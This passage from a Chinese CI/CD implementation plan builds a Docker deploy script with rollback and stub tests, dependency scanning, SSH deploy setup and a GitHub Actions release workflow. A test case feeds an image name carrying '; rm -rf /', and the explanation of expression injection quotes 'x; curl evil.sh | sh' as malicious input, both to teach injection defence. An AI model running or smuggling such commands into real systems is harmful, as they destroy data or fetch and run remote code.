    extra_hosts:
      # 让容器通过 host.docker.internal 访问宿主机上的 MySQL 与 Redis
      - "host.docker.internal:host-gateway"

volumes:
  vector_memory:
  app_logs:
```

- **`image: ${IMAGE:?...}`**：镜像版本从环境变量传入，没传就直接报错。不写死 `latest`：`latest` 会随每次发布变化，写死它的话，「回滚到旧版本」就无从谈起
- **`env_file: .env`**：把服务器上的 `.env` 作为容器的环境变量。密钥只存在于这一个文件里，不进 Git，也不进镜像
- **具名卷，而不是绑定宿主机目录**：如果写 `./data:/app/vector_memory`，宿主机目录的属主是部署用户，容器里的 uid 10001 没有写权限。具名卷第一次挂载时，Docker 会按镜像里这个目录的属主来初始化，所以能直接写入。数据保存在 Docker 管理的位置，容器重建、镜像升级都不会丢
- **`extra_hosts: host.docker.internal:host-gateway`**：在容器里，`127.0.0.1` 指的是容器自己。MySQL 和 Redis 装在宿主机上时，`.env` 里要把主机名写成 `host.docker.internal`（Task 11 会讲）

- [ ] **Step 2: 写失败的测试**

**知识点**：K18 Shell 严格模式与「桩」测试

创建 `deploy/test_deploy.sh`：

```bash
#!/usr/bin/env bash
# deploy.sh 的测试：用假的 docker 与 curl 代替真实命令（桩），在任何有 bash 的机器上都能跑，不需要 Docker。
#   bash deploy/test_deploy.sh
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
OLD=ghcr.io/owner/repo:sha-aaaaaaa
NEW=ghcr.io/owner/repo:sha-bbbbbbb
failures=0

# 每个用例一个全新的临时目录：放一份 deploy.sh 和两个桩命令
setup() {
  WORK="$(mktemp -d)"
  cp "$SCRIPT_DIR/deploy.sh" "$WORK/"
  mkdir "$WORK/bin"
  # 假 docker：记录调用；compose up 时把 IMAGE 写进 running，代表「现在跑的是哪个版本」
  cat > "$WORK/bin/docker" <<'STUB'
#!/usr/bin/env bash
echo "docker $* IMAGE=${IMAGE:-}" >> "$WORK/calls.log"
if [[ "$1 $2" == "compose up" ]]; then echo "$IMAGE" > "$WORK/running"; fi
STUB
  # 假 curl：当前运行的版本在 HEALTHY 列表里就返回成功，模拟就绪检查
  cat > "$WORK/bin/curl" <<'STUB'
#!/usr/bin/env bash
running="$(cat "$WORK/running" 2>/dev/null || true)"
[[ " $HEALTHY " == *" $running "* ]]
STUB
  chmod +x "$WORK/bin/docker" "$WORK/bin/curl"
  export WORK
}

run_deploy() {
  PATH="$WORK/bin:$PATH" HEALTH_RETRIES=2 HEALTH_INTERVAL=0 bash "$WORK/deploy.sh" "$@" >"$WORK/out.log" 2>&1
}

check() {
  local name="$1"; shift
  if "$@"; then echo "  通过：$name"; else echo "  失败：$name"; failures=$((failures + 1)); fi
}

echo "用例 1：新版本健康，记录为当前版本"
setup; echo "$OLD" > "$WORK/.current_image"; export HEALTHY="$OLD $NEW"
run_deploy "$NEW" && code=0 || code=$?
check "退出码为 0" test "$code" -eq 0
check "当前版本更新为新版本" test "$(cat "$WORK/.current_image")" = "$NEW"
check "没有回滚" test "$(cat "$WORK/running")" = "$NEW"

echo "用例 2：新版本不健康，回滚到上一个版本"
setup; echo "$OLD" > "$WORK/.current_image"; export HEALTHY="$OLD"
run_deploy "$NEW" && code=0 || code=$?
check "退出码非 0，让流水线变红" test "$code" -ne 0
check "线上跑回了旧版本" test "$(cat "$WORK/running")" = "$OLD"
check "当前版本记录仍是旧版本" test "$(cat "$WORK/.current_image")" = "$OLD"

echo "用例 3：第一次部署就失败，没有可回滚的版本"
setup; export HEALTHY=""
run_deploy "$NEW" && code=0 || code=$?
check "退出码非 0" test "$code" -ne 0
check "没有写入当前版本" test ! -f "$WORK/.current_image"
check "提示没有可回滚的版本" grep -q "没有可回滚的版本" "$WORK/out.log"

echo "用例 4：镜像名不合法，直接拒绝"
setup; export HEALTHY="$NEW"
run_deploy 'ghcr.io/owner/repo:latest; rm -rf /' && code=0 || code=$?
check "退出码为 2" test "$code" -eq 2
check "没有调用 docker" test ! -f "$WORK/calls.log"

echo
if [[ "$failures" -gt 0 ]]; then echo "$failures 项失败"; exit 1; fi
echo "全部通过"
```

**「桩」（stub）** 是用来顶替真实依赖的假实现。`deploy.sh` 要调用 `docker` 和 `curl`，测试时把一个装着假 `docker`、假 `curl` 的目录放到 `PATH` 最前面，脚本调用的就是假命令：
- 假 `docker` 只做记录。执行 `compose up` 时，把 `IMAGE` 写进一个文件，代表「现在跑的是哪个版本」
- 假 `curl` 根据「现在跑的是哪个版本」是否在 `HEALTHY` 列表里，返回成功或者失败

这样不装 Docker、不连服务器，就能测到回滚逻辑。第 4 个用例专门测注入：镜像名里带着 `; rm -rf /`，脚本必须在调用 docker 之前就拒绝它。

Run: `bash deploy/test_deploy.sh`（Windows 下在 Git Bash 里执行）
Expected: 打印出「用例 1」的标题后，立刻报 `cp: cannot stat '.../deploy/deploy.sh': No such file or directory`，退出码为 1。测试脚本开了 `set -e`，准备阶段一出错就停下来，不会继续往下跑

在 PowerShell 里直接输入 `bash`，可能会打开 WSL 里的 bash，而不是 Git Bash。所以要么在 Git Bash 窗口里执行，要么写出 Git Bash 的完整路径，例如 `& "C:\Program Files\Git\bin\bash.exe" deploy/test_deploy.sh`

- [ ] **Step 3: 实现**

创建 `deploy/deploy.sh`：

```bash
#!/usr/bin/env bash
# 在服务器上执行：拉取指定版本的镜像并替换运行中的容器；新版本通不过就绪检查时，自动回滚到上一个版本。
#
# 用法：deploy.sh <镜像>，例如 deploy.sh ghcr.io/jepson-wang/question_set_program:sha-1a2b3c4
# 平时由 GitHub Actions 通过 SSH 调用；也可以登录服务器手动执行，回滚到指定旧版本时就是这么用的。
set -euo pipefail

IMAGE="${1:-}"
# 只接受「ghcr.io/仓库:sha-7位提交号」：镜像名会拼进命令，先校验格式，杜绝注入
if [[ ! "$IMAGE" =~ ^ghcr\.io/[a-z0-9._/-]+:sha-[0-9a-f]{7}$ ]]; then
  echo "镜像名不合法：'$IMAGE'（期望 ghcr.io/<owner>/<repo>:sha-<7位提交号>）" >&2
  exit 2
fi

# 以脚本所在目录为工作目录：docker compose 在这里找 docker-compose.yml 和 .env
cd "$(dirname "$0")"

READY_URL="${READY_URL:-http://127.0.0.1:8000/health/ready}"
HEALTH_RETRIES="${HEALTH_RETRIES:-30}"   # 默认每 2 秒检查一次，最多等 60 秒
HEALTH_INTERVAL="${HEALTH_INTERVAL:-2}"
STATE_FILE=.current_image                # 记录当前线上版本，回滚时读它

previous=""
if [[ -f "$STATE_FILE" ]]; then
  previous="$(cat "$STATE_FILE")"
fi

wait_ready() {
  local i
  for ((i = 1; i <= HEALTH_RETRIES; i++)); do
    if curl -fsS --max-time 3 "$READY_URL" >/dev/null 2>&1; then
      return 0
    fi
    sleep "$HEALTH_INTERVAL"
  done
  return 1
}

start() {
  IMAGE="$1" docker compose up -d --remove-orphans
}

echo "拉取镜像 $IMAGE"
IMAGE="$IMAGE" docker compose pull
start "$IMAGE"

if wait_ready; then
  echo "$IMAGE" > "$STATE_FILE"
  # 只清理没有标签的悬空镜像；旧版本的镜像要留着，回滚时用
  docker image prune -f >/dev/null
  echo "部署成功：$IMAGE"
  exit 0
fi

echo "新版本没有通过就绪检查，最近 100 行日志：" >&2
IMAGE="$IMAGE" docker compose logs --tail 100 >&2 || true

if [[ -z "$previous" ]]; then
  echo "这是第一次部署，没有可回滚的版本，请根据上面的日志排查" >&2
  exit 1
fi

echo "回滚到上一个版本：$previous" >&2
start "$previous"
if wait_ready; then
  echo "已回滚到 $previous；本次部署失败" >&2
else
  echo "回滚后仍未就绪，需要人工处理" >&2
fi
exit 1
```

- **`set -euo pipefail`**（K18）：`-e` 表示任何命令失败就立刻退出，不带着错误继续往下执行；`-u` 表示使用未定义的变量时报错，拼错变量名不会悄悄变成空字符串；`-o pipefail` 表示管道里任何一段失败，整条管道就算失败。不加这三项的话，Shell 脚本在出错后会继续执行，而且往往会造成更大的破坏
- **先校验参数，再做任何事**（K26）：镜像名会被拼进 docker 命令。只接受严格的格式，就从源头上杜绝了注入
- **`.current_image` 状态文件**（K20）：只有就绪检查通过后才写入。所以它永远记录着「最后一个确认可用的版本」，回滚时读它
- **失败时先打印日志、再回滚**：回滚之后，新版本的容器就没了，日志也跟着消失
- **`docker image prune -f`**：只清理没有标签的悬空镜像。旧版本的镜像都带着 `sha-` 标签，会被保留下来，回滚时不用重新下载

Run: `bash deploy/test_deploy.sh`
Expected: 4 个用例、11 项检查全部通过，最后一行是「全部通过」

编写时对它做过变异验证：分别去掉「回滚」「镜像名校验」「只在成功时记录版本」这三处，每次都有对应的检查失败。

- [ ] **Step 4: 把部署脚本纳入 CI**

在 `ci.yml` 的 lint job 里，`hadolint` 那一步之前插入：

```yaml
      - name: shellcheck（部署脚本）
        run: shellcheck deploy/*.sh
```

在 test job 的最后（「上传测试报告」之后）追加：

```yaml
      - name: 部署脚本的测试
        run: bash deploy/test_deploy.sh
```

到这里，`ci.yml` 就是最终版了，完整内容见本文附录 A。

- [ ] **Step 5: 本地检查并提交**

```bash
shellcheck deploy/*.sh
actionlint
git add deploy/ .github/workflows/ci.yml
git commit -m "feat: 新增服务器部署脚本（就绪检查失败自动回滚）及其桩测试"
git push origin backend
```

Expected: 本地两条检查都没有输出；推送后，CI 的「静态检查」和「后端测试」里多出来的两步都是绿色。

---

## Task 10: 依赖漏洞扫描与自动更新

**为什么**：项目依赖的 149 个包里，任何一个出现安全漏洞，项目就跟着暴露。编写本计划时扫描过一次：**有 21 个包存在已知漏洞**，比如 aiohttp、starlette、langchain-core、pyjwt、pillow、nltk。

**为什么扫描不阻塞合并**：其中很多需要跨大版本升级才能修复，比如 starlette 要从 0.52 升到 1.x，这又要求 FastAPI 一起升级。这不是一个 CI 任务能顺手做完的，需要单独规划并测试。如果现在就把漏洞扫描设成必需检查，所有 PR 都会被挡住。所以分两步走：
1. 现在：每周扫描一次、出报告，发现漏洞时这次运行标红，提醒你去处理；但它不是 PR 的必需检查
2. 以后：漏洞清零后，再把它加进 `ci.yml`，设为必需检查

**Files:**
- Create: `.github/workflows/security.yml`
- Create: `.github/dependabot.yml`

- [ ] **Step 1: 本地先扫一遍，看看基线**

**知识点**：K21 供应链安全

```bash
pip-audit -r backend/requirements.txt --no-deps --disable-pip --progress-spinner off
```

Expected: `Found ... known vulnerabilities in 21 packages`，这个数字会随着新漏洞的披露而变化。`--no-deps --disable-pip` 表示只检查文件里列出的这些固定版本，不重新解析依赖。

- [ ] **Step 2: 定时扫描的 workflow**

**知识点**：K22 定时任务、K10 触发器

创建 `.github/workflows/security.yml`：

```yaml
name: Security

on:
  schedule:
    - cron: "0 1 * * 1"          # 每周一 01:00 UTC（北京时间 09:00）
  push:
    branches: [main]
    paths: [backend/requirements.txt]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  pip-audit:
    name: 依赖漏洞扫描
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-python@v7
        with:
          python-version: "3.14"
          cache: pip
          cache-dependency-path: backend/requirements-tools.txt

      - name: 安装 pip-audit
        run: pip install -r backend/requirements-tools.txt

      - name: 扫描 requirements.txt
        # 扫描结果写进运行摘要；发现漏洞时本次运行标红，但它不是 PR 的必需检查，不会挡住合并
        run: |
          set +e
          pip-audit -r backend/requirements.txt --no-deps --disable-pip \
            --progress-spinner off --format markdown > audit.md
          status=$?
          set -e
          {
            echo "## 依赖漏洞扫描"
            cat audit.md
          } >> "$GITHUB_STEP_SUMMARY"
          exit "$status"
```

- **`schedule` 的 `cron` 用的是 UTC 时间**：`0 1 * * 1` 表示每周一的 01:00 UTC，也就是北京时间 09:00。五个字段依次是：分、时、日、月、星期。定时任务只在默认分支（main）上的 workflow 文件里生效
- **`set +e` … `set -e`**：先临时允许失败，这样即使发现了漏洞，也能把报告写进摘要，最后再用 pip-audit 原本的退出码来决定这次运行的成败

- [ ] **Step 3: Dependabot**

**知识点**：K21 供应链安全

创建 `.github/dependabot.yml`：

```yaml
version: 2
updates:
  - package-ecosystem: pip
    directory: /backend           # 会同时处理这个目录下的 requirements*.txt
    target-branch: backend        # 日常开发在 backend 分支，版本更新的 PR 发到这里（安全更新始终发往默认分支）
    schedule:
      interval: weekly
      day: monday
      time: "09:00"
      timezone: Asia/Shanghai
    open-pull-requests-limit: 5
    groups:                       # 同一家族的包一起升，避免版本互相不兼容
      langchain:
        patterns: ["langchain*", "langgraph*", "langsmith"]
      llama-index:
        patterns: ["llama-index*", "llama_index*"]
      lint-tools:
        patterns: ["ruff", "shellcheck-py", "hadolint-py", "pip-audit"]

  - package-ecosystem: github-actions
    directory: /
    target-branch: backend
    schedule:
      interval: monthly

  - package-ecosystem: docker
    directory: /
    target-branch: backend
    schedule:
      interval: monthly

  - package-ecosystem: npm
    directory: /frontend
    target-branch: backend
    schedule:
      interval: monthly
    open-pull-requests-limit: 3
```

- Dependabot 是 GitHub 自带的服务：它按计划检查依赖有没有新版本，有的话自动开 PR，由 CI 自动测试，你只需要看结果、决定合不合并
- 覆盖四类依赖：Python 包、workflow 里用到的 Action、Dockerfile 的基础镜像、前端的 npm 包
- **`groups`**：langchain、langgraph、langsmith 这一家子的版本互相有约束，分开升级容易出现不兼容，所以放在一个 PR 里一起升
- **`target-branch: backend`**：版本更新的 PR 发往日常开发分支，走完整的开发流程。**安全更新是例外**：GitHub 规定安全更新的 PR 始终发往默认分支，这一点无法配置
- 开启安全更新：Settings → Advanced Security（旧版界面叫 Code security and analysis）→ 打开 Dependabot alerts 和 Dependabot security updates

- [ ] **Step 4: 提交**

```bash
actionlint
git add .github/workflows/security.yml .github/dependabot.yml
git commit -m "feat: 每周依赖漏洞扫描，Dependabot 自动更新依赖、Action 与基础镜像"
git push origin backend
```

合并到 main 之后，到 Actions → Security → Run workflow 手动运行一次。Expected: 运行标红，摘要里有一张漏洞表，这是预期的结果，因为 21 个包的基线还在。之后要做的是依赖升级，那需要一份单独的计划。

---

## Task 11: 服务器与 GitHub 的一次性配置

> **已由部署计划取代，跳过本任务**：由部署计划的 Task 1、4、8 取代（见 `docs/superpowers/plans/2026-09-15-production-deployment.md`）。

这个任务几乎全是手动操作，不写代码。按顺序做，每一步都有检查的方法。

**Files:**
- Create: `backend/.env.example`

**Interfaces:**
- Produces（Task 12 要用）：
  - GitHub 环境 `production`，其中的 Secrets：`DEPLOY_SSH_KEY`、`DEPLOY_KNOWN_HOSTS`
  - `production` 环境的 Variables：`DEPLOY_HOST`、`DEPLOY_USER`、`DEPLOY_PORT`、`DEPLOY_PATH`、`PRODUCTION_URL`
  - 服务器上的部署目录 `${DEPLOY_PATH}`，里面放好 `.env`

- [ ] **Step 1: 配置模板**

**知识点**：K2 12-Factor 配置

创建 `backend/.env.example`：

```bash
# 配置模板。复制为 .env 后填写真实值：
#   本地开发：backend/.env
#   服务器：部署目录下的 .env（与 docker-compose.yml 放在一起）
# .env 里有密钥，永远不要提交到 Git（.gitignore 已经忽略了它）；这个模板里只写键名和示例，不写真实值。
# 环境变量的优先级高于 .env：同名变量已经存在时，.env 里的值不会生效。

# ---------- 大模型（阿里云 DashScope 的 OpenAI 兼容接口）----------
API_KEY=
API_URL=https://dashscope.aliyuncs.com/compatible-mode/v1
MODEL_NAME=qwen-plus
EMBEDDING_MODEL=qwen3-vl-embedding
# 可选：给各个智能体单独指定模型，不填就用 MODEL_NAME
# PLANNER_MODEL=
# EXTRACT_MODEL=
# QUESTION_SET_MODEL=
# COMMON_MODEL=

# ---------- 鉴权 ----------
# 生成：python -c "import secrets; print(secrets.token_hex(32))"
# 本地、测试、生产各用各的，互不相同
JWT_SECRET_KEY=

# ---------- MySQL ----------
# 服务器上 MySQL 与应用在同一台机器时，容器里要用 host.docker.internal 访问宿主机
SQL_DATABASE_URL=mysql+asyncmy://user:password@127.0.0.1:3306/question_set

# ---------- Redis ----------
REDIS_HOST=127.0.0.1
REDIS_PORT=6379
REDIS_PASSWORD=
REDIS_USERNAME=

# ---------- 向量库目录（留给 RAG）----------
# 记忆计划改版后，对话记忆存 MySQL，这个目录当前没有使用者；
# 留着是因为它是镜像里唯一 chown 给 uid 10001 的可写数据目录，RAG 上线时把 RAG_DB_DIR 指到它下面即可。
# 相对路径以进程的工作目录为准；容器里工作目录是 /app，对应 docker-compose.yml 挂载的卷
VECTOR_MEMORY_DIR=./vector_memory
```

`.env.example` 要提交，`.env` 永远不提交。前者告诉别人「需要配置哪些项」，后者保存真实的值。之所以取名 `.env.example`，而不是 `example.env`，是因为 `.gitignore` 里有一条 `*.env`，后者会被它忽略掉。

```bash
git check-ignore -v backend/.env.example || echo "可以提交"
git add backend/.env.example
git commit -m "docs: 新增配置模板 .env.example"
```

- [ ] **Step 2: 服务器准备**

在服务器上执行（以 Ubuntu 为例）：

```bash
# 1. Docker Engine 与 compose 插件，按官方文档安装：https://docs.docker.com/engine/install/ubuntu/
docker compose version        # 能打印版本号即可
curl --version                # deploy.sh 用 curl 做就绪检查

# 2. 专用的部署用户，只做部署这一件事
sudo adduser --disabled-password --gecos "" deploy
sudo usermod -aG docker deploy

# 3. 部署目录
sudo mkdir -p /opt/question_set_program
sudo chown deploy:deploy /opt/question_set_program
```

`docker` 组的成员实际上拥有等同 root 的权限，所以这个用户只用来部署，不做别的事。

- [ ] **Step 3: 服务器上的 `.env`**

**知识点**：K4 密钥管理

以 `deploy` 用户的身份，参照 `.env.example` 创建 `/opt/question_set_program/.env`，填入生产环境的真实值：

- `JWT_SECRET_KEY`：**重新生成一个**（`python3 -c "import secrets; print(secrets.token_hex(32))"`），不能和本地共用，更不能用 Task 3 删掉的那个旧值
- MySQL、Redis 如果和应用在同一台服务器上，主机名写 `host.docker.internal`，比如 `SQL_DATABASE_URL=mysql+asyncmy://user:pass@host.docker.internal:3306/question_set`、`REDIS_HOST=host.docker.internal`。同时要确认 MySQL 和 Redis 监听的不只是 `127.0.0.1`，否则容器连不进来。MySQL 看 `bind-address`，Redis 看 `bind`，可以改成 `0.0.0.0`，再用防火墙挡住外网访问

```bash
chmod 600 /opt/question_set_program/.env   # 只有 deploy 用户能读
```

- [ ] **Step 4: 部署专用的 SSH 密钥**

**知识点**：K23 SSH 密钥部署与主机指纹校验

在**你自己的电脑**上生成一对新密钥，专门给 GitHub Actions 用，不要复用你个人的密钥：

```bash
ssh-keygen -t ed25519 -f qsp_deploy -C "github-actions-deploy" -N ""
```

- `qsp_deploy.pub`（公钥）：追加到服务器 `/home/deploy/.ssh/authorized_keys` 的末尾
- `qsp_deploy`（私钥）：Step 6 会存进 GitHub Secrets，存完就删掉本地这份

然后获取服务器的**主机指纹**：

```bash
ssh-keyscan -p 22 你的服务器地址 > known_hosts_line
cat known_hosts_line
```

**要核对指纹**：在服务器上执行 `ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub`，再在本机执行 `ssh-keygen -lf known_hosts_line`，比较两者输出的 SHA256 指纹是否一致。一致才说明你拿到的确实是这台服务器的公钥，而不是被中间人冒充的。

workflow 里设置了 `StrictHostKeyChecking yes`：连接时，服务器的指纹必须和保存的一致，否则拒绝连接。很多教程写的是 `StrictHostKeyChecking=no`，意思是「不管对方是谁都信任」，那样 CI 可能会把代码和令牌交给一个冒充的服务器。

验证一下能不能登录：

```bash
ssh -i qsp_deploy -o UserKnownHostsFile=known_hosts_line deploy@你的服务器地址 "docker compose version"
```

- [ ] **Step 5: GitHub 环境**

**知识点**：K24 Environments、Secrets 与 Variables

GitHub 仓库 → Settings → Environments → New environment，名称填 `production`：

1. **Deployment branches and tags**：选 Selected branches，只允许 `main`。其他分支的 workflow 就算写了 `environment: production`，也拿不到这个环境里的密钥
2. **Required reviewers**（可选）：勾选自己。每次部署都会停下来等你在网页上点「Approve」，适合想先看一眼再上线的场景

- [ ] **Step 6: 录入 Secrets 和 Variables**

在 `production` 环境的页面里添加：

| 类型 | 名称 | 值 |
|---|---|---|
| Secret | `DEPLOY_SSH_KEY` | `qsp_deploy` 私钥文件的完整内容（包括首尾的 BEGIN/END 行） |
| Secret | `DEPLOY_KNOWN_HOSTS` | `known_hosts_line` 文件的内容 |
| Variable | `DEPLOY_HOST` | 服务器地址 |
| Variable | `DEPLOY_USER` | `deploy` |
| Variable | `DEPLOY_PORT` | `22`（或者你的 SSH 端口） |
| Variable | `DEPLOY_PATH` | `/opt/question_set_program` |
| Variable | `PRODUCTION_URL` | 服务的访问地址，比如 `http://你的服务器地址:8000`，会显示在部署记录上 |

**Secrets 和 Variables 的区别**：Secret 存进去之后，谁都看不到明文，日志里出现也会被自动替换成 `***`；Variable 是明文，适合放不敏感的配置。服务器地址算不上机密，放在 Variable 里，排查问题时能直接看到。录完之后，删掉本机的 `qsp_deploy` 私钥文件。

`GITHUB_TOKEN` 不用手动配置，每次运行都会自动生成。

---

## Task 12: 发布流水线

> **已由部署计划取代，跳过本任务**：由部署计划的 Task 4、8 取代；镜像推送到阿里云 ACR，而不是 GHCR（见 `docs/superpowers/plans/2026-09-15-production-deployment.md`）。

**Files:**
- Create: `.github/workflows/release.yml`

**Interfaces:**
- Consumes: Task 7 的 `ci.yml`（`workflow_call`）；Task 8 的 Dockerfile；Task 9 的 `deploy/`；Task 11 的环境、Secrets 与 Variables
- Produces:
  - 推送到 main 时自动发布；手动运行时可以填 `image_tag`（形如 `sha-1a2b3c4`），跳过测试和构建，直接部署这个版本
  - 镜像 `ghcr.io/<仓库名全小写>:sha-<7位>` 和 `:latest`

- [ ] **Step 1: 写 workflow**

**知识点**：K25 可复用 workflow 与 job 间传值、K26 表达式注入、K27 短期凭据、K20 不可变标签、K12 并发控制

创建 `.github/workflows/release.yml`：

```yaml
name: Release

on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      image_tag:
        description: "回滚用：填一个已有的镜像标签（如 sha-1a2b3c4），跳过测试与构建直接部署；留空则构建当前提交"
        required: false
        default: ""

permissions:
  contents: read

concurrency:
  group: release                  # 同一时间只允许一次发布
  cancel-in-progress: false       # 部署做到一半被取消很危险，新的发布排队等待

jobs:
  ci:
    name: 检查与测试
    if: inputs.image_tag == ''    # push 事件没有 inputs，表达式结果为空字符串，条件成立
    uses: ./.github/workflows/ci.yml

  image:
    name: 构建并推送镜像
    needs: ci
    runs-on: ubuntu-latest
    timeout-minutes: 30
    permissions:
      contents: read
      packages: write             # 推送到 GHCR 需要写 packages 的权限
    outputs:
      tag: ${{ steps.name.outputs.tag }}
    steps:
      - uses: actions/checkout@v7

      - name: 计算镜像名与标签
        id: name
        # GHCR 要求镜像名全小写，而仓库属主 Jepson-Wang 有大写字母；表达式语法没有转小写函数，只能用 shell
        run: |
          echo "image=ghcr.io/${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"
          echo "tag=sha-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"

      - uses: docker/setup-buildx-action@v4

      - uses: docker/login-action@v4
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: 构建并推送
        uses: docker/build-push-action@v7
        with:
          context: .
          push: true
          tags: |
            ${{ steps.name.outputs.image }}:${{ steps.name.outputs.tag }}
            ${{ steps.name.outputs.image }}:latest
          labels: |
            org.opencontainers.image.source=${{ github.server_url }}/${{ github.repository }}
            org.opencontainers.image.revision=${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy:
    name: 部署到生产环境
    needs: image
    # image 被跳过（手动回滚）时也要部署；其余情况必须 image 成功
    if: >-
      !cancelled() &&
      (needs.image.result == 'success' ||
       (needs.image.result == 'skipped' && inputs.image_tag != ''))
    runs-on: ubuntu-latest
    timeout-minutes: 15
    environment:
      name: production
      url: ${{ vars.PRODUCTION_URL }}
    permissions:
      contents: read
      packages: read              # 服务器用这个 job 的 GITHUB_TOKEN 临时登录 GHCR 拉镜像
    env:
      DEPLOY_HOST: ${{ vars.DEPLOY_HOST }}
      DEPLOY_USER: ${{ vars.DEPLOY_USER }}
      DEPLOY_PORT: ${{ vars.DEPLOY_PORT }}
      DEPLOY_PATH: ${{ vars.DEPLOY_PATH }}
    steps:
      - uses: actions/checkout@v7

      - name: 确定要部署的镜像
        id: target
        env:
          # 用户输入先放进环境变量再在 shell 里使用；直接把 ${{ inputs.xxx }} 写进 run 会被当作代码执行
          INPUT_TAG: ${{ inputs.image_tag }}
          BUILT_TAG: ${{ needs.image.outputs.tag }}
        run: |
          tag="${INPUT_TAG:-$BUILT_TAG}"
          if [[ ! "$tag" =~ ^sha-[0-9a-f]{7}$ ]]; then
            echo "::error::镜像标签不合法：'$tag'，应形如 sha-1a2b3c4"
            exit 1
          fi
          echo "image=ghcr.io/${GITHUB_REPOSITORY,,}:${tag}" >> "$GITHUB_OUTPUT"

      - name: 配置 SSH
        env:
          SSH_KEY: ${{ secrets.DEPLOY_SSH_KEY }}
          KNOWN_HOSTS: ${{ secrets.DEPLOY_KNOWN_HOSTS }}
        run: |
          install -m 700 -d ~/.ssh
          printf '%s\n' "$SSH_KEY" > ~/.ssh/deploy_key
          chmod 600 ~/.ssh/deploy_key
          printf '%s\n' "$KNOWN_HOSTS" > ~/.ssh/known_hosts
          {
            echo "Host deploy-target"
            echo "  HostName ${DEPLOY_HOST}"
            echo "  User ${DEPLOY_USER}"
            echo "  Port ${DEPLOY_PORT:-22}"
            echo "  IdentityFile ~/.ssh/deploy_key"
            echo "  IdentitiesOnly yes"
            echo "  BatchMode yes"
            echo "  StrictHostKeyChecking yes"
          } > ~/.ssh/config

      - name: 上传编排文件与部署脚本
        run: scp deploy/docker-compose.yml deploy/deploy.sh "deploy-target:${DEPLOY_PATH}/"

      - name: 服务器临时登录 GHCR
        env:
          GHCR_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        # ssh 把整条命令当作一个字符串交给服务器的 shell：变量在 runner 上展开是有意为之（SC2029）。
        # 能这样做的前提是这些值可信：用户名来自 GitHub，镜像标签在上一步校验过格式
        run: |
          # shellcheck disable=SC2029
          printf '%s' "$GHCR_TOKEN" | ssh deploy-target "docker login ghcr.io -u '${GITHUB_ACTOR}' --password-stdin"

      - name: 部署（失败会自动回滚）
        env:
          IMAGE: ${{ steps.target.outputs.image }}
        run: |
          # shellcheck disable=SC2029
          ssh deploy-target "bash '${DEPLOY_PATH}/deploy.sh' '${IMAGE}'"

      - name: 退出 GHCR 登录
        if: always()
        run: ssh deploy-target "docker logout ghcr.io" || true

      - name: 写入部署摘要
        if: always()
        env:
          IMAGE: ${{ steps.target.outputs.image }}
          JOB_STATUS: ${{ job.status }}
        run: |
          {
            echo "## 部署结果：${JOB_STATUS}"
            echo "- 镜像：\`${IMAGE}\`"
            echo "- 回滚方法：Actions → Release → Run workflow，填入上一个成功版本的标签"
          } >> "$GITHUB_STEP_SUMMARY"
```

**逐段解释**

**① 三个 job 的依赖关系（K25）**。`ci` → `image` → `deploy`，由 `needs` 串起来：前一个成功，后一个才会开始。`ci` 这个 job 没有 `runs-on` 和 `steps`，只有一行 `uses: ./.github/workflows/ci.yml`，表示「调用另一个 workflow」，也就是**可复用 workflow**。检查逻辑只写在 `ci.yml` 一个地方，PR 和发布跑的是完全相同的检查。

**② job 之间传值（K25）**。`image` job 算出的标签，要交给 `deploy` job 使用。step 用 `echo "tag=..." >> "$GITHUB_OUTPUT"` 写出一个输出；job 用 `outputs: tag: ${{ steps.name.outputs.tag }}` 把它公开出去；后面的 job 用 `needs.image.outputs.tag` 来读取。

**③ 两种运行方式与 `if` 条件（K25）**
- 推送到 main：没有 `inputs`，`inputs.image_tag` 是空字符串，三个 job 依次执行
- 手动回滚（`workflow_dispatch`，填了 `image_tag`）：`ci` 的条件不成立，被跳过；`image` 依赖 `ci`，也跟着被跳过。`deploy` 默认也会因为「依赖被跳过」而跳过，所以它的 `if` 写的是：`image` 成功，**或者** `image` 被跳过、但填了 `image_tag`。`!cancelled()` 让这个条件在依赖被跳过时依然会被判断

**④ 并发控制（K12）**。`group: release` 保证同一时间只有一个发布在进行。`cancel-in-progress: false` 表示新的发布在后面排队，而不是取消正在进行的那个：部署做到一半被打断，服务器可能停在「旧容器已经删了、新容器还没起来」的状态。

**⑤ 镜像名转小写**。GHCR 要求镜像名全小写，而 `github.repository` 是 `Jepson-Wang/question_set_program`。GitHub 的表达式语法里没有转小写的函数，只能在 shell 里用 `${GITHUB_REPOSITORY,,}`（bash 的「全部转小写」写法）。

**⑥ 两个标签（K20）**。`sha-<提交号>` 是**不可变**标签：一个标签永远对应同一个镜像，看到标签就知道线上跑的是哪次提交，回滚时指定它即可。`latest` 每次发布都会变，只是方便人工查看，部署时从不使用它。`org.opencontainers.image.source` 这个 label 会让 GHCR 自动把镜像和仓库关联起来。

**⑦ 权限按 job 分配（K11）**。只有 `image` 有 `packages: write`，可以推送镜像；`deploy` 只有 `packages: read`。哪个 job 被攻破，能造成的破坏都被限制在它自己的权限以内。

**⑧ 表达式注入（K26）**。`${{ ... }}` 是在 shell 执行**之前**，由 GitHub 直接把值替换进脚本文本里的。如果写成 `run: echo ${{ inputs.image_tag }}`，而有人在输入框里填了 `x; curl evil.sh | sh`，这段内容就会被当作命令执行。正确的做法是先放进 `env:`，再在脚本里写 `"$INPUT_TAG"`：这时它只是一个变量的值，不会被当作代码。除此之外，这里还用正则校验了标签格式，`deploy.sh` 里又校验了一次，形成纵深防御。actionlint 能自动发现这类问题（Task 7 Step 3）。

**⑨ SSH 配置（K23）**。私钥和 known_hosts 都写进 runner 的 `~/.ssh/`，再写一段 `Host deploy-target` 配置，后面的 `scp` 和 `ssh` 就只需要写 `deploy-target`：
- `BatchMode yes`：禁止交互式询问，出问题时立刻失败，而不是卡在「请输入密码」上，直到超时
- `StrictHostKeyChecking yes`：只信任 known_hosts 里的指纹
- `IdentitiesOnly yes`：只用指定的这把密钥

